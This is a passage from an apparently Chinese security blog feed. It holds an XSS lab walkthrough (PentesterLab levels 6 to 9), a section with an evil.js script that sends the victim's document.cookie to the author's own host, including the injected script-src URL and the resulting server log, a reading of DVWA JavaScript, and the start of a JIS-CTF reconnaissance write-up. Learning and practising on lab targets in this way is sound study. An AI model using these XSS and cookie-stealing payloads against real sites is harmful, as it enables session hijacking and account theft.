"</span><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="xml">";</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>发现本来就有script标签了的，这也是为什么先前屏幕不显示的原因</p><p>仔细看看发现只有输入的把前面的”号闭合了就可以执行自己想要的js代码了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.106</span><span class="regexp">/xss/</span>example6.php?name=<span class="number">1</span><span class="string">";alert('flag');</span></span><br></pre></td></tr></table></figure><p>仍然不弹出，再看看源码</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello </span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">var</span> $a= <span class="string">"1"</span>;alert(<span class="string">'flag'</span>);<span class="string">";</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>发现忘记闭合后面的引号了使用注释试试（注意js的注释是//而不是#）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.106</span><span class="regexp">/xss/</span>example6.php?name=<span class="number">1</span><span class="string">";alert('flag');//</span></span><br></pre></td></tr></table></figure><p>成功弹出框</p><h4 id="1-8、第七关"><a href="#1-8、第七关" class="headerlink" title="1.8、第七关"></a>1.8、第七关</h4><p>这次学到上关的经验了，直接看源代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> $a= <span class="string">'hacker'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果没有过滤输入的话相信只要把前面的引号闭合和后面的引号注释就行了。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.106</span><span class="regexp">/xss/</span>example7.php?name=<span class="number">1</span><span class="string">';alert('</span>flag<span class="string">');//</span></span><br></pre></td></tr></table></figure><p>直接弹框</p><h4 id="1-9、第八关"><a href="#1-9、第八关" class="headerlink" title="1.9、第八关"></a>1.9、第八关</h4><p><img src="/assets/image-20180601144627983.png" alt="image-20180601144627983"></p><p>这次换了做法，改为提交参数了。</p><p>先试一下</p><p>输入1</p><p><img src="/assets/image-20180601144656941.png" alt="image-20180601144656941"></p><p>输入<code>&lt;script&gt;alert(&#39;flag&#39;)&lt;/script&gt;</code></p><p><img src="/assets/image-20180601144748978.png" alt="image-20180601144748978"></p><p>看来数据没有被当为代码执行</p><p>使用单引号双引号都没用，到底为什么呢？</p><p>看看源代码：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action="/xss/example8.php" <span class="keyword">method</span>="POST"&gt;</span><br><span class="line">  Your <span class="type">name</span>:&lt;<span class="keyword">input</span> <span class="keyword">type</span>="text" <span class="type">name</span>="name" /&gt;</span><br><span class="line">  &lt;<span class="keyword">input</span> <span class="keyword">type</span>="submit" <span class="type">name</span>="submit"/&gt;</span><br></pre></td></tr></table></figure><p>很惊奇的发现action的目标居然是本身。</p><p>忽然之间想到学php的时候w3cschool上面讲到action最好别用自身，</p><p>参见：<a href="http://www.w3school.com.cn/php/php_form_validation.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/php_form_validation.asp</a></p><p>如果把action的引号闭合掉，弄为</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form <span class="built_in">action</span>=<span class="string">"/xss/example8.php"</span>&gt;&lt;script&gt;alert(<span class="string">'flag'</span>)&lt;/script&gt;<span class="comment">// "method="POST"&gt; </span></span><br><span class="line">Your <span class="built_in">name</span>:&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> <span class="built_in">name</span>=<span class="string">"name"</span> /&gt; </span><br><span class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> <span class="built_in">name</span>=<span class="string">"submit"</span>/&gt;</span><br></pre></td></tr></table></figure><p>是不是就能弹框了？试一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.200.106/xss/example8.php/"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'flag'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20180601145817629.png" alt="image-20180601145817629"></p><p>成功弹框。</p><h4 id="1-10、第九关"><a href="#1-10、第九关" class="headerlink" title="1.10、第九关"></a>1.10、第九关</h4><p>URL：<a href="http://192.168.200.106/xss/example9.php#hacker" target="_blank" rel="noopener">http://192.168.200.106/xss/example9.php#hacker</a></p><p>源码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.write(location.hash.substring(<span class="number">1</span>));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>显示：<img src="/assets/image-20180601150140807.png" alt="image-20180601150140807"></p><p>注意到由location.hash，看下这个属性的定义</p><p>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</p><p>看来是将#后面的字符显示在屏幕上，而且里面已经有script标签了。</p><p>尝试闭合一下write里的)试试</p><p>DOM型XSS，#后面输入payload即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.200.106/xss/example9.php#<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(‘flag‘)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、JS实战"><a href="#2、JS实战" class="headerlink" title="2、JS实战"></a>2、JS实战</h3><p>在第一部分我们已经攻下了靶机的XSS关，那么XSS有什么用呢？仅仅是弹框吗？我们用所学的JS来获取一些有用信息。</p><p>为了方便，所以就拿刚刚靶场的第一关来做测试</p><p>(1)盗取cookie</p><p>首先在自己的主机上/3/html文件下搭建一个js文件evil.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">"a"</span>); <span class="comment">//创建一个对象</span></span><br><span class="line">a.src=<span class="string">"http://192.168.43.244/3/html/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie); <span class="comment">//对象的源地址</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);<span class="comment">//把对象加入为网页的body的子控件</span></span><br></pre></td></tr></table></figure><p>因为靶机网页里没有cookie所以用google的EditThisCookie给靶机加了个cookie:</p><p>user:hacer</p><p>现在只需要在靶机网页上访问我的evil.js就能在我的web服务器日志中看到请求。可用如下方式访问</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.43.244/3/html/evil.js"</span>&gt;</span> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>网页中为：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">43.146</span>/xss/example1.php<span class="built_in">?name</span>=<span class="meta">%3Cscript</span><span class="meta">%20src</span>=<span class="meta">%22http:</span>//<span class="number">192.168</span>.<span class="number">43.244</span>/<span class="number">3</span>/html/evil.js<span class="meta">%22</span><span class="meta">%3E</span><span class="meta">%3C</span>/script<span class="meta">%3E</span></span><br></pre></td></tr></table></figure><p>然后在自己的apache服务器下的/var/log/apache2找到日志</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.43.244</span> - - <span class="string">[02/Jun/2018:19:40:17 +0800]</span> <span class="string">"<span class="keyword">GET</span> /3/html/log?user%3Dhacer HTTP/1.1"</span> <span class="number">404</span> <span class="number">208</span></span><br></pre></td></tr></table></figure><p>可以看到cookie已经成功显示：</p><p>user%3dhacer</p><p>即user:hacer</p><p>(2)基本语法测试</p><p>改一下evil.js。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">'host:'</span>+location.hostname+<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'path:'</span>+location.pathname+<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'port:'</span>+location.port+<span class="string">"&lt;/br&gt;"</span>);</span><br></pre></td></tr></table></figure><p>访问,屏幕显示：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello  <span class="string">host:</span><span class="number">192.168</span><span class="number">.43</span><span class="number">.146</span> </span><br><span class="line"><span class="string">path:</span><span class="regexp">/xss/</span>example1.php</span><br><span class="line"><span class="string">port:</span></span><br></pre></td></tr></table></figure><p>再改一下evil.js</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">window</span>.<span class="keyword">open</span>("http://www.baidu.com");</span><br><span class="line"><span class="keyword">window</span>.closed="true";</span><br></pre></td></tr></table></figure><p>这样就会打开另外一个网页并关闭原来的网页。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">downloadFile(<span class="string">"https://pentesterlab.com/exercises/linux_host_review/iso"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">downloadFile</span>(<span class="params">url</span>) </span>&#123;   </span><br><span class="line">   <span class="keyword">try</span>&#123; </span><br><span class="line">        <span class="keyword">var</span> elemIF = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);   </span><br><span class="line">        elemIF.src = url;   </span><br><span class="line">        elemIF.style.display = <span class="string">"none"</span>;   </span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(elemIF);   </span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123; </span><br><span class="line">        zzrw.alert(<span class="string">"下载异常！"</span>);</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就会下载一个文档。</p><p>因为XSS也是入门所以更多的练习将会在以后开展。</p><h3 id="3、JS代码阅读"><a href="#3、JS代码阅读" class="headerlink" title="3、JS代码阅读"></a>3、JS代码阅读</h3><p>看一下dvwa的dvwaPage.js代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Help popup */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">popUp</span>(<span class="params">URL</span>) </span>&#123;</span><br><span class="line">day = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">id = day.getTime();</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"page"</span> + id + <span class="string">" = window.open(URL, '"</span> + id + <span class="string">"', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width=500,height=300,left = 540,top = 250');"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Form validation */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_required</span>(<span class="params">field,alerttxt</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">with</span> (field) &#123;</span><br><span class="line">  <span class="keyword">if</span> (value==<span class="literal">null</span>||value==<span class="string">""</span>) &#123;</span><br><span class="line">    alert(alerttxt);<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_form</span>(<span class="params">thisform</span>) </span>&#123;</span><br><span class="line"><span class="keyword">with</span> (thisform) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Guestbook form</span></span><br><span class="line">  <span class="keyword">if</span> (validate_required(txtName,<span class="string">"Name can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;txtName.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (validate_required(mtxMessage,<span class="string">"Message can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;mtxMessage.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是三个函数</p><p>先看第一个函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">popUp</span>(<span class="params">URL</span>) </span>&#123;</span><br><span class="line">day = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">id = day.getTime();</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"page"</span> + id + <span class="string">" = window.open(URL, '"</span> + id + <span class="string">"', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width=500,height=300,left = 540,top = 250');"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入参数是URL,意思传入一个网页</p><p>首先根据new Date()获取今天的日期并赋值给一个day变量。</p><p>再调用day变量中的getTime()方法获取时间并赋值给id变量。</p><p>再调用eval函数执行里面的代码。里面的代码为打开一个新窗口，并制定窗口风格大小等，并把这个窗口的句柄赋值给页面的id。</p><p>接着看第二个函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_required</span>(<span class="params">field,alerttxt</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">with</span> (field) &#123;</span><br><span class="line">  <span class="keyword">if</span> (value==<span class="literal">null</span>||value==<span class="string">""</span>) &#123;</span><br><span class="line">    alert(alerttxt);<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数的主要功能是验证输入值是否为空。</p><p>函数传入两个参数field和alerttxt，返回值为布尔类型。</p><p>然后验证field的value变量是否为空，是的话弹出alertxt的内容返回false。</p><p>否则的话返回true.</p><p>再看第三个函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_form</span>(<span class="params">thisform</span>) </span>&#123;</span><br><span class="line"><span class="keyword">with</span> (thisform) &#123;</span><br><span class="line">  <span class="comment">// Guestbook form</span></span><br><span class="line">  <span class="keyword">if</span> (validate_required(txtName,<span class="string">"Name can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;txtName.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (validate_required(mtxMessage,<span class="string">"Message can not be empty."</span>)==<span class="literal">false</span>)</span><br><span class="line">  &#123;mtxMessage.focus();<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数的主要功能使验证提交的表单。</p><p>输入参数为thisform，返回值为布尔类型。</p><p>逻辑是先调用validate_required()函数判断thisform.txtName是否为空，为空则把光标放在txtName输入框，返回false。</p><p>不为空再调用validate_required()函数判断thisform.mtxMessage是否为空,为空则把光标放在mtxMessage输入框，返回false。不为空返回true。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为笔者有一定js基础，所以只对一些js忘了的知识和重要难点进行记录以及做了一些与JS有关的XSS实战。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://blog.ydq6.com/categories/web/"/>
    
    
      <category term="web" scheme="http://blog.ydq6.com/tags/web/"/>
    
      <category term="js" scheme="http://blog.ydq6.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JIS-CTF靶机测试</title>
    <link href="http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/"/>
    <id>http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</id>
    <published>2020-05-06T14:54:59.000Z</published>
    <updated>2020-05-06T15:16:00.266Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JIS-CTF-靶机测试"><a href="#JIS-CTF-靶机测试" class="headerlink" title="JIS-CTF 靶机测试"></a>JIS-CTF 靶机测试</h1><p>​                                                                                      </p><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><p>从下面网站下载ova文件并导入到virtual box中。</p><p><a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/</a></p><a id="more"></a><h2 id="二、找flag"><a href="#二、找flag" class="headerlink" title="二、找flag"></a>二、找flag</h2><h3 id="（1）ip探测"><a href="#（1）ip探测" class="headerlink" title="（1）ip探测"></a>（1）ip探测</h3><p>首先探测靶机的IP地址</p><p>netdiscover -i eth0</p><p>发现mac地址08:00:27:68:18:58对应的ip地址为192.168.1.118</p><h3 id="（2）端口扫描"><a href="#（2）端口扫描" class="headerlink" title="（2）端口扫描"></a>（2）端口扫描</h3><p>扫描下端口、服务和操作系统</p><p>nmap -sV -O 192.168.1.118</p><p>结果:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.2</span>p2 Ubuntu <span class="number">4</span>ubuntu2<span class="number">.1</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span><span class="number">.18</span> ((Ubuntu))</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">68</span>:<span class="number">18</span>:<span class="number">58</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="number">4.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.8</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS <span class="keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br></pre></td></tr></table></figure><p>只开了ssh端口和http端口，且是apache服务器，Ubuntu系统</p><p>（3）扫描下常见漏洞：</p><p>nmap –script=vuln 192.168.1.118</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Host is up (<span class="number">0.00060</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line"><span class="number">80</span>/tcp open  http</span><br><span class="line">| <span class="type">http</span>-csrf:</span><br><span class="line">| <span class="type">Spidering</span> limited to: maxdepth=<span class="number">3</span>; maxpagecount=<span class="number">20</span>; withinhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span></span><br><span class="line">|   <span class="type">Found</span> the following possible CSRF vulnerabilities:</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Path</span>: http://<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span>:<span class="number">80</span>/</span><br><span class="line">|     <span class="type">Form</span> id:</span><br><span class="line">|<span class="type">_</span>    Form action: check_login.php</span><br><span class="line">|<span class="type">_http</span>-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">| <span class="type">http</span>-enum:</span><br><span class="line">|   <span class="type">/admin_area</span>/: Possible admin folder</span><br><span class="line">|   <span class="type">/login</span>.php: Possible admin folder</span><br><span class="line">|   <span class="type">/admin_area</span>/index.php: Possible admin folder</span><br><span class="line">|   <span class="type">/robots</span>.txt: Robots file</span><br><span class="line">|   <span class="type">/css</span>/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.18</span> (ubuntu)'</span><br><span class="line">|<span class="type">_</span>  /js/: Potentially interesting directory w/ listing on 'apache/<span class="number">2.4</span><span class="number">.18</span> (ubuntu)'</span><br><span class="line">| <span class="type">http</span>-slowloris-check:</span><br><span class="line">|   <span class="type">VULNERABLE</span>:</span><br><span class="line">|   <span class="type">Slowloris</span> DOS attack</span><br><span class="line">|     <span class="type">State</span>: LIKELY VULNERABLE</span><br><span class="line">|     <span class="type">IDs</span>:  CVE:CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|       <span class="type">Slowloris</span> tries to keep many connections to the target web server open and hold</span><br><span class="line">|       <span class="type">them</span> open <span class="built_in">as</span> long <span class="built_in">as</span> possible.  It accomplishes this <span class="built_in">by</span> opening connections to</span><br><span class="line">|       <span class="type">the</span> target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       <span class="type">the</span> http server's resources causing Denial Of Service.</span><br><span class="line">|<span class="type"></span></span><br><span class="line"><span class="type">|     Disclosure</span> date: <span class="number">2009</span><span class="number">-09</span><span class="number">-17</span></span><br><span class="line">|     <span class="type">References</span>:</span><br><span class="line">|       <span class="type">https</span>://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="number">-2007</span><span class="number">-6750</span></span><br><span class="line">|<span class="type">_</span>      http://ha.ckers.org/slowloris/</span><br><span class="line">|<span class="type">_http</span>-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">|<span class="type">_http</span>-vuln-cve2017<span class="number">-1001000</span>: ERROR: <span class="keyword">Script</span> execution failed (use -d to debug)</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">68</span>:<span class="number">18</span>:<span class="number">58</span> (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure><h3 id="（4）找第一个flag"><a href="#（4）找第一个flag" class="headerlink" title="（4）找第一个flag"></a>（4）找第一个flag</h3><p>有robots敏感目录</p><p>robots.txt文件：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /</span><br><span class="line"><span class="string">Disallow:</span> /backup</span><br><span class="line"><span class="string">Disallow:</span> /admin</span><br><span class="line"><span class="string">Disallow:</span> /admin_area</span><br><span class="line"><span class="string">Disallow:</span> /r00t</span><br><span class="line"><span class="string">Disallow:</span> /uploads</span><br><span class="line"><span class="string">Disallow:</span> /uploaded_files</span><br><span class="line"><span class="string">Disallow:</span> /flag</span><br></pre></td></tr></table></figure><p>flag敏感目录很明显，进入拿到第一个flag</p><p>The 1st flag is : {8734509128730458630012095}</p><h3 id="（5）找第二个flag"><a href="#（5）找第二个flag" class="headerlink" title="（5）找第二个flag"></a>（5）找第二个flag</h3><p>再查找其他隐藏目录，一个个的翻，终于在</p><p>admin_area/index.php下找到。</p><p>在第一遍查看时我直接看到这个就跳过了，然后找半天没有办法再一个个仔细看，在这个源代码中发现了第二个flag.</p><p>源代码：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">Fake admin area :)</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>The admin area not work :) <span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span 